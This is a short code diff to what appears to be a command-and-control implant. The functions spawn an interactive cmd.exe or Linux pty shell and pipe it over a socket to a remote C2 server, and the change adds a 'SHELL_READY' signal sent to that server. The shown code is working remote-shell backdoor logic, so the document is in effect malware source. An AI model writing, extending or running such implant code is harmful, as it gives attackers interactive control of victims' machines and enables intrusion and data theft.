@@ -68,6 +68,9 @@ def windows_interactive_shell(c2_client):
         threading.Thread(target=write_to_proc, daemon=True).start()
         threading.Thread(target=read_from_proc, daemon=True).start()
 
+        # Notify server that shell is ready
+        c2_client.sendall(b"SHELL_READY\n")
+
         proc.wait()
     except Exception as e:
         c2_client.sendall(f"[WinShell] Could not spawn cmd.exe: {e}\n".encode("UTF-8"))
@@ -104,6 +107,9 @@ def spawn_interactive_shell_linux(c2_client):
         os.close(slave_fd)
         # read shell output in a thread
         threading.Thread(target=read_shell_output_linux, args=(master_fd, c2_client), daemon=True).start()
+
+        # Notify server that shell is ready
+        c2_client.sendall(b"SHELL_READY\n")
 
         # read input from server, write to shell
         while shell_proc.poll() is None and not exit_event.is_set():
